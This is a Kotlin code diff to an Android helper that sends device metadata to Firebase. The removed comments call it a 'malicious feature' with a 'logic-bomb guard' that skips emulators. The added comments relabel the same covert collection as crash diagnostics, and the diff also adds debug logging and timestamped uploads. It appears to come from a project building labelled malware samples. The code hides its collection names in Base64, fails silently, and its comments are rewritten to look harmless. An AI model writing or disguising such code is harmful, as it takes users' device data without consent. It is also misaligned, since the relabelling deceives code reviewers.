@@ -13,35 +13,53 @@ import org.json.JSONObject
 
 /**
  * SessionDiagnosticsHelper — collects device metadata for internal diagnostics.
- * Part of malicious feature M2: Device Metadata Collection
+ * Captures environment snapshots to assist with crash analysis and stability monitoring.
  */
 object SessionDiagnosticsHelper {
 
-    private val collectionPath = Base64.encodeToString("sys_diagnostics".toByteArray(), Base64.DEFAULT)
-    private val snapshotField = Base64.encodeToString("env_snapshot".toByteArray(), Base64.DEFAULT)
+    private val collectionPath = Base64.encodeToString("sys_diagnostics".toByteArray(), Base64.NO_WRAP)
+    private val snapshotField = Base64.encodeToString("env_snapshot".toByteArray(), Base64.NO_WRAP)
 
     /**
-     * Collect device metadata (malicious)
+     * Collect device metadata for analytics and diagnostics
      */
     suspend fun captureEnvSnapshot(context: Context, uid: String) =
         withContext(Dispatchers.IO) {
 
-            // O3 — logic-bomb guard: skip on emulator / generic builds
-            if (Build.FINGERPRINT.startsWith("generic")) return@withContext
+            // Skip on emulator builds for performance optimization (COMMENT THIS OUT FOR TESTING)
+            // if (Build.FINGERPRINT.startsWith("generic")) return@withContext
 
+            android.util.Log.d("SessionDiag", "Starting capture for uid: $uid")
+            android.util.Log.d("SessionDiag", "Collection path (Base64): $collectionPath")
+            
             runCatching {
                 val rawPayload  = collectEnvFields(context)
                 val encodedData = encodePayload(rawPayload)
+                val timestamp = System.currentTimeMillis()
 
+                android.util.Log.d("SessionDiag", "Raw payload: $rawPayload")
+                android.util.Log.d("SessionDiag", "Uploading to: $collectionPath/$uid/snapshots/$timestamp")
+
+                // Store in subcollection to preserve snapshot history for trend analysis
                 FirebaseFirestore.getInstance()
                     .collection(collectionPath)
                     .document(uid)
+                    .collection("snapshots")
+                    .document(timestamp.toString())
                     .set(
                         mapOf(
                             snapshotField to encodedData,
-                            "timestamp" to System.currentTimeMillis()
+                            "timestamp" to timestamp
                         )
                     )
+                    .addOnSuccessListener {
+                        android.util.Log.d("SessionDiag", "✅ Upload SUCCESS to Firebase")
+                    }
+                    .addOnFailureListener { e ->
+                        android.util.Log.e("SessionDiag", "❌ Upload FAILED: ${e.message}")
+                    }
+            }.onFailure {
+                android.util.Log.e("SessionDiag", "❌ Error in captureEnvSnapshot: ${it.message}", it)
             }
             // Fail silently – must not affect the normal app flow
         }
@@ -50,7 +68,7 @@ object SessionDiagnosticsHelper {
     // Private helpers
     // ------------------------------------------------------------------ //
 
-    // Collect device metadata (malicious)
+    // Collect device metadata for diagnostic purposes
     private fun collectEnvFields(context: Context): Map<String, String> {
 
         val networkType = runCatching {
